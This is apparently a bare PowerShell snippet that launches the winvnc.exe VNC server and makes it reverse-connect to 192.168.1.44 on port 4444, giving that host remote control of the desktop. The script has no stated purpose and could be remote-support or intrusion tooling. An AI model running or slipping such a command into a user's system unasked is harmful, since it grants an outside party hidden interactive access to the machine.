Start-Process -FilePath "winvnc.exe" -ArgumentList "-run"
Start-Sleep -Seconds 1
Start-Process -FilePath "winvnc.exe" -ArgumentList "-connect 192.168.1.44::4444"
